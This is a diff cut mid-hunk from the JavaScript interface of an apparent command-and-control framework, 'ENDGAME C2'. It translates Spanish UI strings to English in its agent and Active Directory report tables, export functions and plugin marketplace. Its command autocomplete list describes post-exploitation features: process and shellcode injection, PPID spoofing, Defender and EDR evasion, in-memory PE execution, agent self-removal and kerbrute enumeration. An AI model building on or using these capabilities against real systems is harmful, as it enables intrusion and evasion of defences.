-      ['Nombre','SO','Activo','Delegación','Último logon'], rows));
+    parts.push(sectionTable('COMPUTERS', computers.length,
+      ['Name','OS','Active','Delegation','Last logon'], rows));
   }
 
   // ── Agents (agent-report) ──────────────────────────────────────────────────
@@ -6509,8 +6509,8 @@ function renderPluginResult(result) {
         <td style="padding:5px 8px;font-size:11px">${active ? '<span style="color:var(--green)">Active</span>' : '<span style="color:var(--text3)">Dead</span>'}</td>
       </tr>`;
     }).join('');
-    parts.push(sectionTable('AGENTES', agents.length,
-      ['ID','Hostname','Usuario','Privilegio','Transport/Lang','Estado'], rows));
+    parts.push(sectionTable('AGENTS', agents.length,
+      ['ID','Hostname','User','Privilege','Transport/Lang','Status'], rows));
   }
 
   // ── AD objects (ad-analyzer) ───────────────────────────────────────────────
@@ -6522,7 +6522,7 @@ function renderPluginResult(result) {
         <td style="padding:5px 8px;font-size:10px;color:var(--text3)">${esc(p.labels||'')}</td>
       </tr>`;
     }).join('');
-    parts.push(sectionTable('OBJETOS AD', adObjs.length, ['Nombre','Tipo'], rows));
+    parts.push(sectionTable('AD OBJECTS', adObjs.length, ['Name','Type'], rows));
   }
 
   // ── Metadata ───────────────────────────────────────────────────────────────
@@ -6564,7 +6564,7 @@ function pluginExportBar(id) {
 
 function exportPluginReport(format, id) {
   const stored = (window._pluginResults || {})[id];
-  if (!stored?.result) { toast('No hay resultado para exportar', 'red'); return; }
+  if (!stored?.result) { toast('No result to export', 'red'); return; }
   const { result, title } = stored;
   const slug = (title || id).replace(/[^a-z0-9_-]/gi, '_');
 
@@ -6574,7 +6574,7 @@ function exportPluginReport(format, id) {
       downloadBlobFile(slug + '.html', html, 'text/html');
     } else {
       const win = window.open('', '_blank');
-      if (!win) { toast('Permite pop-ups para exportar PDF', 'red'); return; }
+      if (!win) { toast('Allow pop-ups to export PDF', 'red'); return; }
       win.document.write(html);
       win.document.close();
       setTimeout(() => { win.focus(); win.print(); }, 400);
@@ -6625,21 +6625,21 @@ function buildPluginHTMLDoc(result, title) {
   };
 
   const usersTable = entityRows('user',
-    ['Usuario','Activo','Flags','Descripción','Último logon'],
+    ['User','Active','Flags','Description','Last logon'],
     e => { const p=e.props||{}; const on=p.enabled==='True'; const flags=[p.kerberoastable==='True'?'Kerb':'',p.asreproastable==='True'?'AS-REP':'',p.adminCount?'Admin':'',p.delegation==='True'?'Deleg':''].filter(Boolean).join(', ');
     return `<tr style="border-top:1px solid #e5e7eb${!on?';opacity:.5':''}"><td style="padding:5px 10px;font-family:monospace;font-size:12px">${q(e.name||'')}</td><td style="padding:5px 10px">${on?'✓':'✗'}</td><td style="padding:5px 10px;font-size:11px">${q(flags||'—')}</td><td style="padding:5px 10px;font-size:11px;color:#6b7280">${q(p.description||'')}</td><td style="padding:5px 10px;font-size:11px;color:#6b7280;white-space:nowrap">${q(p.lastLogon||'')}</td></tr>`; });
 
   const computersTable = entityRows('computer',
-    ['Nombre','SO','Activo','Delegación','Último logon'],
+    ['Name','OS','Active','Delegation','Last logon'],
     e => { const p=e.props||{}; const on=p.enabled==='True';
-    return `<tr style="border-top:1px solid #e5e7eb${!on?';opacity:.5':''}"><td style="padding:5px 10px;font-family:monospace;font-size:12px">${q(e.name||'')}</td><td style="padding:5px 10px;font-size:11px;color:#6b7280">${q(p.os||'')}</td><td style="padding:5px 10px">${on?'✓':'✗'}</td><td style="padding:5px 10px">${p.delegation==='True'?'⚠ Sí':'No'}</td><td style="padding:5px 10px;font-size:11px;color:#6b7280;white-space:nowrap">${q(p.lastLogon||'')}</td></tr>`; });
+    return `<tr style="border-top:1px solid #e5e7eb${!on?';opacity:.5':''}"><td style="padding:5px 10px;font-family:monospace;font-size:12px">${q(e.name||'')}</td><td style="padding:5px 10px;font-size:11px;color:#6b7280">${q(p.os||'')}</td><td style="padding:5px 10px">${on?'✓':'✗'}</td><td style="padding:5px 10px">${p.delegation==='True'?'⚠ Yes':'No'}</td><td style="padding:5px 10px;font-size:11px;color:#6b7280;white-space:nowrap">${q(p.lastLogon||'')}</td></tr>`; });
 
   const agentsTable = entityRows('agent',
-    ['ID','Hostname','Usuario','Privilegio','Transport','Estado'],
+    ['ID','Hostname','User','Privilege','Transport','Status'],
     e => { const p=e.props||{}; const on=p.active==='True'; const adm=p.is_admin==='True';
     return `<tr style="border-top:1px solid #e5e7eb${!on?';opacity:.5':''}"><td style="padding:5px 10px;font-family:monospace;font-size:11px">${q((e.id||'').slice(0,8))}</td><td style="padding:5px 10px;font-size:12px">${q(p.hostname||'')}</td><td style="padding:5px 10px;font-family:monospace;font-size:11px">${q(p.username||'')}</td><td style="padding:5px 10px;font-size:11px;color:${adm?'#dc2626':'#6b7280'}">${adm?'SYSTEM/Admin':'User'}</td><td style="padding:5px 10px;font-size:11px;color:#6b7280">${q(p.transport||'')}</td><td style="padding:5px 10px;font-size:11px;color:${on?'#059669':'#6b7280'}">${on?'Active':'Dead'}</td></tr>`; });
 
-  const adObjTable = entityRows('ad-object',['Nombre','Labels'],
+  const adObjTable = entityRows('ad-object',['Name','Labels'],
     e => { const p=e.props||{}; return `<tr style="border-top:1px solid #e5e7eb"><td style="padding:5px 10px;font-family:monospace;font-size:12px">${q(e.name||'')}</td><td style="padding:5px 10px;font-size:11px;color:#6b7280">${q(p.labels||'')}</td></tr>`; });
 
   const metaHTML = (() => {
@@ -6675,7 +6675,7 @@ function buildPluginHTMLDoc(result, title) {
 <div class="header">
   <div style="font-size:11px;color:#6b7280;letter-spacing:.1em;font-weight:600;margin-bottom:4px">ENDGAME C2 — PLUGIN REPORT</div>
   <h1>${q(title||'Report')}</h1>
-  <div class="meta">Generado: ${q(now)}</div>
+  <div class="meta">Generated: ${q(now)}</div>
 </div>
 ${result.summary ? `<div class="summary">${q(result.summary)}</div>` : ''}
 ${findingsHTML ? `<h2>Hallazgos</h2>${findingsHTML}` : ''}
@@ -6698,29 +6698,29 @@ function buildPluginCSV(result) {
   const sections = [];
 
   if (users.length) {
-    sections.push('USUARIOS');
-    sections.push(row(['Usuario','Activo','Kerberoastable','AS-REP','Admin','Delegación','Descripción','Último logon']));
-    users.forEach(e => { const p=e.props||{}; sections.push(row([e.name,p.enabled==='True'?'Sí':'No',p.kerberoastable==='True'?'Sí':'No',p.asreproastable==='True'?'Sí':'No',p.adminCount?'Sí':'No',p.delegation==='True'?'Sí':'No',p.description||'',p.lastLogon||''])); });
+    sections.push('USERS');
+    sections.push(row(['User','Active','Kerberoastable','AS-REP','Admin','Delegation','Description','Last logon']));
+    users.forEach(e => { const p=e.props||{}; sections.push(row([e.name,p.enabled==='True'?'Yes':'No',p.kerberoastable==='True'?'Yes':'No',p.asreproastable==='True'?'Yes':'No',p.adminCount?'Yes':'No',p.delegation==='True'?'Yes':'No',p.description||'',p.lastLogon||''])); });
     sections.push('');
   }
 
   if (computers.length) {
-    sections.push('EQUIPOS');
-    sections.push(row(['Nombre','SO','Activo','Delegación','Último logon']));
-    computers.forEach(e => { const p=e.props||{}; sections.push(row([e.name,p.os||'',p.enabled==='True'?'Sí':'No',p.delegation==='True'?'Sí':'No',p.lastLogon||''])); });
+    sections.push('COMPUTERS');
+    sections.push(row(['Name','OS','Active','Delegation','Last logon']));
+    computers.forEach(e => { const p=e.props||{}; sections.push(row([e.name,p.os||'',p.enabled==='True'?'Yes':'No',p.delegation==='True'?'Yes':'No',p.lastLogon||''])); });
     sections.push('');
   }
 
   if (agents.length) {
-    sections.push('AGENTES');
-    sections.push(row(['ID','Hostname','Usuario','Admin','Transport','Lenguaje','Estado']));
-    agents.forEach(e => { const p=e.props||{}; sections.push(row([(e.id||'').slice(0,8),p.hostname||'',p.username||'',p.is_admin==='True'?'Sí':'No',p.transport||'',p.language||'',p.active==='True'?'Active':'Dead'])); });
+    sections.push('AGENTS');
+    sections.push(row(['ID','Hostname','User','Admin','Transport','Language','Status']));
+    agents.forEach(e => { const p=e.props||{}; sections.push(row([(e.id||'').slice(0,8),p.hostname||'',p.username||'',p.is_admin==='True'?'Yes':'No',p.transport||'',p.language||'',p.active==='True'?'Active':'Dead'])); });
     sections.push('');
   }
 
   if (findings.length) {
-    sections.push('HALLAZGOS');
-    sections.push(row(['Severidad','Título','Descripción']));
+    sections.push('FINDINGS');
+    sections.push(row(['Severity','Title','Description']));
     findings.forEach(f => sections.push(row([f.severity||'',f.title||'',f.description||''])));
     sections.push('');
   }
@@ -6747,19 +6747,19 @@ function showPluginsSubTab(name) {
 async function marketplaceRefresh() {
   const statusEl = document.getElementById('marketplace-status');
   const listEl   = document.getElementById('marketplace-list');
-  if (statusEl) { statusEl.textContent = 'Cargando marketplace…'; statusEl.style.color = 'var(--text3)'; }
-  if (listEl)   listEl.innerHTML = '<div style="padding:14px;color:var(--text3);font-size:12px">Cargando…</div>';
+  if (statusEl) { statusEl.textContent = 'Loading marketplace…'; statusEl.style.color = 'var(--text3)'; }
+  if (listEl)   listEl.innerHTML = '<div style="padding:14px;color:var(--text3);font-size:12px">Loading…</div>';
 
   const response = await api('GET', '/api/plugins/marketplace');
   if (!response?.ok) {
-    const err = response?.error || 'Error al cargar el marketplace';
+    const err = response?.error || 'Error loading marketplace';
     if (statusEl) { statusEl.textContent = err; statusEl.style.color = 'var(--red)'; }
     if (listEl)   listEl.innerHTML = `<div style="padding:14px;color:var(--red);font-size:12px">${esc(err)}</div>`;
     return;
   }
 
   const plugins = Array.isArray(response.data?.plugins) ? response.data.plugins : [];
-  if (statusEl) { statusEl.textContent = `${plugins.length} plugin${plugins.length === 1 ? '' : 's'} disponibles`; statusEl.style.color = 'var(--text3)'; }
+  if (statusEl) { statusEl.textContent = `${plugins.length} plugin${plugins.length === 1 ? '' : 's'} available`; statusEl.style.color = 'var(--text3)'; }
   if (!listEl) return;
 
   if (!plugins.length) {
@@ -7007,7 +7007,7 @@ function _mkSVGCanvas(containerId, canvasId, svgId) {
   // hint
   const hint = document.createElement('div');
   hint.style.cssText = 'position:absolute;bottom:10px;right:14px;font-size:10px;color:var(--text3);pointer-events:none';
-  hint.innerHTML = 'Pan: drag fondo · Zoom: scroll · Dbl-click: reset · <span style="cursor:pointer;text-decoration:underline" onclick="resetViewPositions(\''+containerId+'\')" title="Borrar posiciones guardadas">Reset nodos</span>';
+  hint.innerHTML = 'Pan: drag background · Zoom: scroll · Dbl-click: reset · <span style="cursor:pointer;text-decoration:underline" onclick="resetViewPositions(\''+containerId+'\')" title="Clear saved positions">Reset nodes</span>';
   container.appendChild(hint);
   return {canvas, svg};
 }
@@ -7965,7 +7965,7 @@ function renderAgentGraph() {
   c2.id = 'gnode-c2';
   const _fwSVG = `<img src='data:image/png;base64,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' width='56' height='56' style='object-fit:contain'>`;
   const _pubLine = (c2ShowPublicIP && c2PublicIP)
-    ? `<div class="node-sublabel" style="color:#ff4444;font-weight:600" title="IP pública">${esc(c2PublicIP)}</div>`
+    ? `<div class="node-sublabel" style="color:#ff4444;font-weight:600" title="Public IP">${esc(c2PublicIP)}</div>`
     : '';
   const _privLines = c2IPs.length
     ? c2IPs.map(ip => `<div class="node-sublabel">${esc(ip)}</div>`).join('')
@@ -9246,20 +9246,20 @@ const AC_COMMANDS = [
   ['!kerbrute','!kerbrute userenum -d domain --dc <ip> users.txt'],
   // AGENTE
   // SERVER
-  ['jobs','jobs — listar listeners activos del servidor'],
-  ['job kill','job kill <id> — detener listener por ID'],
-  // AGENTE
-  ['info','detalles del agente'],
+  ['jobs','jobs — list active server listeners'],
+  ['job kill','job kill <id> — stop listener by ID'],
+  // AGENT
+  ['info','agent details'],
   ['shell','shell <cmd>'],
   ['sleep','sleep <sec> <jitter%>'],
   ['results','results [n]'],
-  ['tasks','tasks [n] — ver cola de tareas'],
-  ['tasks-kill','tasks-kill <id> — cancelar tarea pendiente por ID'],
-  ['cleanup','auto-eliminar del sistema'],
-  ['back','cerrar consola'],
-  ['kill','terminar proceso del agente'],
+  ['tasks','tasks [n] — view task queue'],
+  ['tasks-kill','tasks-kill <id> — cancel pending task by ID'],
+  ['cleanup','auto-remove from system'],
+  ['back','close console'],
+  ['kill','terminate agent process'],
   // FILESYSTEM
-  ['pwd','directorio actual'],
+  ['pwd','current directory'],
   ['cd','cd <path>'],
   ['ls','ls [path]'],
   ['mkdir','mkdir <path>'],
@@ -9268,33 +9268,33 @@ const AC_COMMANDS = [
   ['cp','cp <src> <dst>'],
   ['mv','mv <src> <dst>'],
   ['grep','grep <pattern> <path>'],
-  ['mount','mount — listar puntos montados'],
+  ['mount','mount — list mounted points'],
   ['chmod','chmod <mode> <path>'],
   ['chown','chown <owner[:group]> <path>'],
   ['chtimes','chtimes <RFC3339> <path>'],
-  ['env','variables de entorno'],
-  // TRANSFERENCIA
-  ['download','download <ruta_remota>'],
-  ['upload','upload <server_file> <ruta_remota>'],
-  // POST-EXPLOTACIÓN
-  ['ps','listar procesos'],
-  ['getpid','getpid — PID del agente'],
-  ['ppid','ppid — PPID del proceso padre'],
-  ['screenshot','captura → servidor'],
-  ['inject','inject <pid> <sc.bin>  — section map + CreateRemoteThread en proceso existente'],
-  ['inject-apc','inject-apc <sc.bin> [proc]  — APC early-bird: spawnea proc suspendido, inyecta, reanuda'],
-  ['dotnet-asm','dotnet-asm <asm.exe> [proc]  — .NET → Donut (shellcode) → APC en proceso sacrificial nuevo; sin CLR visible'],
-  ['dotnet-exec','dotnet-exec <asm.exe> [args]  — .NET inline-execute: CLR nativo en-proceso, captura Console.Write (Rubeus, Seatbelt, SharpHound)'],
-  ['forkrun','forkrun <sc.bin> [proc]  — PPID spoof + section map + thread hijack en proc sacrificial'],
-  ['stage2','stage2 <sc.bin>  — in-process shellcode (CreateThread en agente actual, bypasa Defender)'],
-  ['bof','bof <nombre|archivo.o> [args]  — nombre=BOF del servidor; archivo.o=subido con upload'],
-  ['clrstomp','clrstomp <asm.exe> [args]  — .NET sin Donut/proceso nuevo: CLR vía GAC legítimo, machaca memoria con tu assembly; más sigiloso que dotnet-asm'],
-  ['thread-hijack','thread-hijack <pid> <sc.bin>  — section map + parchear RIP de thread (sin CreateRemoteThread)'],
-  ['hook-check','hook-check  — escanear ntdll/kernel32 en busca de hooks EDR (E9/CC/FF25)'],
-  ['hw-bp-check','hw-bp-check  — detectar hardware breakpoints activos (DR0–DR3)'],
-  ['pe-exec','pe-exec <file.exe> [args]  — cargar y ejecutar PE nativo en memoria sin tocar disco'],
-  ['mem-fluctuate','mem-fluctuate start [secs] | stop  — XOR-muta buffers internos del agente contra escaneos periódicos'],
-  ['encode-uuid','encode-uuid <sc.bin>  — genera código C con UUIDs (UuidFromStringA) listo para compilar'],
+  ['env','environment variables'],
+  // TRANSFER
+  ['download','download <remote_path>'],
+  ['upload','upload <server_file> <remote_path>'],
+  // POST-EXPLOITATION
+  ['ps','list processes'],
+  ['getpid','getpid — agent PID'],
+  ['ppid','ppid — parent process PPID'],
+  ['screenshot','screenshot → server'],
+  ['inject','inject <pid> <sc.bin>  — section map + CreateRemoteThread into existing process'],
+  ['inject-apc','inject-apc <sc.bin> [proc]  — APC early-bird: spawn suspended proc, inject, resume'],
